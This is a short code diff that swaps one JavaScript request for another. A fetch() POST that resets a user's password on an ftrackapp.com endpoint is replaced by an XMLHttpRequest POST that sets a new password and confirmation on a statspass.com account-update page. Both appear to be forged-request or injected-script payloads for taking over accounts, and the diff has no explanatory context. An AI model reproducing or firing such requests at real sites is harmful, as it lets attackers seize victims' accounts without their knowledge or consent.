@@ -1,5 +1,4 @@
-fetch("https://audit1.ftrackapp.com/configure/update", {
-        method: "POST",
-        headers: { "Content-Type": "application/x-www-form-urlencoded" },
-        body: `data=%5B%7B%22password%22%3A%22pAssChangED1234%22%2C%22userid%22%3A%2273c6cfde-4f64-4750-a6c1-f7accfa9a9ba%22%7D%5D&name=users`
-      });
+var xhr = new XMLHttpRequest();
+xhr.open('POST', 'https://statspass.com/reports/mlb/acctUpdate.asp?change=2', true);
+xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+xhr.send('password=hX6*mU5%7DkW&cpassword=hX6*mU5%7DkW');
